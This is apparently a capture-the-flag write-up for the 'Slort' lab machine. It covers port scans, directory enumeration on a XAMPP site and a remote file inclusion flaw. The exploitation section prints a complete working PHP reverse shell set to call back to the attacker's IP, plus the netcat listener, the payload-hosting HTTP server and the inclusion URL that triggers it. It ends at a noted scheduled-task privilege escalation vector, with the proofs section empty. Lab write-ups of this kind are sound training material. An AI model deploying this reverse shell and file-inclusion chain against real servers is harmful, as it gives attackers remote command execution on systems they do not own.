---
description: 11/11/2022
---

# Slort (Intermediate)

<figure><img src="../../../.gitbook/assets/image (7) (5).png" alt=""><figcaption></figcaption></figure>

## Information Gathering

Scanned all TCP ports:

```
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql?
| fingerprint-strings: 
|   Kerberos, LDAPSearchReq, LPDString, NULL: 
|_    Host '192.168.49.81' is not allowed to connect to this MariaDB server
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.81.53:4443/dashboard/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-title: Welcome to XAMPP
|_Requested resource was http://192.168.81.53:8080/dashboard/
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-open-proxy: Proxy might be redirecting requests
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.93%I=7%D=11/11%Time=636E9022%P=x86_64-pc-linux-gnu%r(N
SF:ULL,4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.81'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Kerberos,
SF:4C,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.81'\x20is\x20not\x20allowe
SF:d\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LPDString,4C,
SF:"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.81'\x20is\x20not\x20allowed\x
SF:20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(LDAPSearchReq,4C
SF:,"H\0\0\x01\xffj\x04Host\x20'192\.168\.49\.81'\x20is\x20not\x20allowed\
SF:x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-11-11T18:13:24
|_  start_date: N/A
```

Enumerated UDP ports:

```
PORT     STATE         SERVICE
123/udp  open|filtered ntp
137/udp  open|filtered netbios-ns
138/udp  open|filtered netbios-dgm
500/udp  open|filtered isakmp
1900/udp open|filtered upnp
4500/udp open|filtered nat-t-ike
5050/udp open|filtered mmcc
5353/udp open|filtered zeroconf
5355/udp open|filtered llmnr
```

Notes:



## Enumeration

### Port 4443 - HTTP (XAMPP)

* VHOST enumeration
* Directory enumeration
* Source code analysis (static)
* Visual Inspection of site sources -- passwords, images, etc.

VHOST Enumeration:

```
gobuster vhost -u http://192.168.81.53:4443 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 100 | grep Status: 200
```

Directory Enumeration:

```
gobuster dir -u http://192.168.81.53:4443 -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.81.53:4443
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/11/12 11:14:43 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 1045]
/.htpasswd            (Status: 403) [Size: 1045]
/.hta                 (Status: 403) [Size: 1045]
/aux                  (Status: 403) [Size: 1045]
/cgi-bin/             (Status: 403) [Size: 1059]
/com1                 (Status: 403) [Size: 1045]
/com2                 (Status: 403) [Size: 1045]
/com4                 (Status: 403) [Size: 1045]
/com3                 (Status: 403) [Size: 1045]
/con                  (Status: 403) [Size: 1045]
/dashboard            (Status: 301) [Size: 349] [--> http://192.168.81.53:4443/dashboard/]
/favicon.ico          (Status: 200) [Size: 30894]
/examples             (Status: 503) [Size: 1059]
/img                  (Status: 301) [Size: 343] [--> http://192.168.81.53:4443/img/]
/index.php            (Status: 302) [Size: 0] [--> http://192.168.81.53:4443/dashboard/]
/licenses             (Status: 403) [Size: 1204]
/lpt1                 (Status: 403) [Size: 1045]
/lpt2                 (Status: 403) [Size: 1045]
/nul                  (Status: 403) [Size: 1045]
/phpmyadmin           (Status: 403) [Size: 1204]
/prn                  (Status: 403) [Size: 1045]
/server-status        (Status: 403) [Size: 1204]
/server-info          (Status: 403) [Size: 1204]
/site                 (Status: 301) [Size: 344] [--> http://192.168.81.53:4443/site/]
/webalizer            (Status: 403) [Size: 1045]
Progress: 4627 / 4714 (98.15%)===============================================================
2022/11/12 11:15:05 Finished
```

* /site looks interesting
* Found file inclusion within source code on /site

<figure><img src="../../../.gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

### Port 8080 - HTTP (XAMPP)

mailto:postmaster@localhost

Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6

## Exploitation

### Local File Inclusion (LFI)

<figure><img src="../../../.gitbook/assets/image (6) (4) (1).png" alt=""><figcaption></figcaption></figure>

### Remote File Inclusion (RFI)

* By messing around with the box, I was able to remotely include a file
* Let's use Ivan Sincek's PHP reverse shell and see if the server will execute it

Start nc listener on 8080:

```
nc -lnvp 8080
```

Create reverse shell with revshells and select Windows, IP, Port, and Ivan Sincek's PHP Reverse Shell:

{% embed url="https://www.revshells.com/" %}

php-reverse-shell.php:

```
<?php// Copyright (c) 2020 Ivan Sincek// v2.3// Requires PHP v5.0.0 or greater.// Works on Linux OS, macOS, and Windows OS.// See the original script at https://github.com/pentestmonkey/php-reverse-shell.class Shell {    private $addr  = null;    private $port  = null;    private $os    = null;    private $shell = null;    private $descriptorspec = array(        0 => array('pipe', 'r'), // shell can read from STDIN        1 => array('pipe', 'w'), // shell can write to STDOUT        2 => array('pipe', 'w')  // shell can write to STDERR    );    private $buffer  = 1024;    // read/write buffer size    private $clen    = 0;       // command length    private $error   = false;   // stream read/write error    public function __construct($addr, $port) {        $this->addr = $addr;        $this->port = $port;    }    private function detect() {        $detected = true;        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS            $this->os    = 'LINUX';            $this->shell = 'sh';        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {            $this->os    = 'WINDOWS';            $this->shell = 'cmd.exe';        } else {            $detected = false;            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\n";        }        return $detected;    }    private function daemonize() {        $exit = false;        if (!function_exists('pcntl_fork')) {            echo "DAEMONIZE: pcntl_fork() does not exists, moving on...\n";        } else if (($pid = @pcntl_fork()) < 0) {            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\n";        } else if ($pid > 0) {            $exit = true;            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\n";        } else if (posix_setsid() < 0) {            // once daemonized you will actually no longer see the script's dump            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\n";        } else {            echo "DAEMONIZE: Completed successfully!\n";        }        return $exit;    }    private function settings() {        @error_reporting(0);        @set_time_limit(0); // do not impose the script execution time limit        @umask(0); // set the file/directory permissions - 666 for files and 777 for directories    }    private function dump($data) {        $data = str_replace('<', '&lt;', $data);        $data = str_replace('>', '&gt;', $data);        echo $data;    }    private function read($stream, $name, $buffer) {        if (($data = @fread($stream, $buffer)) === false) { // suppress an error when reading from a closed blocking stream            $this->error = true;                            // set global error flag            echo "STRM_ERROR: Cannot read from ${name}, script will now exit...\n";        }        return $data;    }    private function write($stream, $name, $data) {        if (($bytes = @fwrite($stream, $data)) === false) { // suppress an error when writing to a closed blocking stream            $this->error = true;                            // set global error flag            echo "STRM_ERROR: Cannot write to ${name}, script will now exit...\n";        }        return $bytes;    }    // read/write method for non-blocking streams    private function rw($input, $output, $iname, $oname) {        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {            if ($this->os === 'WINDOWS' && $oname === 'STDIN') { $this->clen += strlen($data); } // calculate the command length            $this->dump($data); // script's dump        }    }    // read/write method for blocking streams (e.g. for STDOUT and STDERR on Windows OS)    // we must read the exact byte length from a stream and not a single byte more    private function brw($input, $output, $iname, $oname) {        $fstat = fstat($input);        $size = $fstat['size'];        if ($this->os === 'WINDOWS' && $iname === 'STDOUT' && $this->clen) {            // for some reason Windows OS pipes STDIN into STDOUT            // we do not like that            // we need to discard the data from the stream            while ($this->clen > 0 && ($bytes = $this->clen >= $this->buffer ? $this->buffer : $this->clen) && $this->read($input, $iname, $bytes)) {                $this->clen -= $bytes;                $size -= $bytes;            }        }        while ($size > 0 && ($bytes = $size >= $this->buffer ? $this->buffer : $size) && ($data = $this->read($input, $iname, $bytes)) && $this->write($output, $oname, $data)) {            $size -= $bytes;            $this->dump($data); // script's dump        }    }    public function run() {        if ($this->detect() && !$this->daemonize()) {            $this->settings();            // ----- SOCKET BEGIN -----            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);            if (!$socket) {                echo "SOC_ERROR: {$errno}: {$errstr}\n";            } else {                stream_set_blocking($socket, false); // set the socket stream to non-blocking mode | returns 'true' on Windows OS                // ----- SHELL BEGIN -----                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);                if (!$process) {                    echo "PROC_ERROR: Cannot start the shell\n";                } else {                    foreach ($pipes as $pipe) {                        stream_set_blocking($pipe, false); // set the shell streams to non-blocking mode | returns 'false' on Windows OS                    }                    // ----- WORK BEGIN -----                    $status = proc_get_status($process);                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\n");                    do {						$status = proc_get_status($process);                        if (feof($socket)) { // check for end-of-file on SOCKET                            echo "SOC_ERROR: Shell connection has been terminated\n"; break;                        } else if (feof($pipes[1]) || !$status['running']) {                 // check for end-of-file on STDOUT or if process is still running                            echo "PROC_ERROR: Shell process has been terminated\n";   break; // feof() does not work with blocking streams                        }                                                                    // use proc_get_status() instead                        $streams = array(                            'read'   => array($socket, $pipes[1], $pipes[2]), // SOCKET | STDOUT | STDERR                            'write'  => null,                            'except' => null                        );                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); // wait for stream changes | will not wait on Windows OS                        if ($num_changed_streams === false) {                            echo "STRM_ERROR: stream_select() failed\n"; break;                        } else if ($num_changed_streams > 0) {                            if ($this->os === 'LINUX') {                                if (in_array($socket  , $streams['read'])) { $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN                                if (in_array($pipes[2], $streams['read'])) { $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET                                if (in_array($pipes[1], $streams['read'])) { $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET                            } else if ($this->os === 'WINDOWS') {                                // order is important                                if (in_array($socket, $streams['read'])/*------*/) { $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); } // read from SOCKET and write to STDIN                                if (($fstat = fstat($pipes[2])) && $fstat['size']) { $this->brw($pipes[2], $socket  , 'STDERR', 'SOCKET'); } // read from STDERR and write to SOCKET                                if (($fstat = fstat($pipes[1])) && $fstat['size']) { $this->brw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); } // read from STDOUT and write to SOCKET                            }                        }                    } while (!$this->error);                    // ------ WORK END ------                    foreach ($pipes as $pipe) {                        fclose($pipe);                    }                    proc_close($process);                }                // ------ SHELL END ------                fclose($socket);            }            // ------ SOCKET END ------        }    }}echo '<pre>';// change the host address and/or port number as necessary$sh = new Shell('192.168.49.81', 8080);$sh->run();unset($sh);// garbage collector requires PHP v5.3.0 or greater// @gc_collect_cycles();echo '</pre>';?>
Privilege Escalation
```

Host the file with a Python HTTP server on Kali and remotely include the file through the web app:

```
python3 -m http.server 4443
```

Detonate Reverse Shell:

```
http://192.168.81.53:8080/site/index.php?page=http://192.168.49.81:4443/php-reverse-shell.php
```

### Foothold

<figure><img src="../../../.gitbook/assets/image (7) (8).png" alt=""><figcaption></figcaption></figure>

### PrivEsc vector

There is a file called TFTP.EXE in \Backup

* It appears to be a scheduled task that runs every 5 minutes

## Proofs
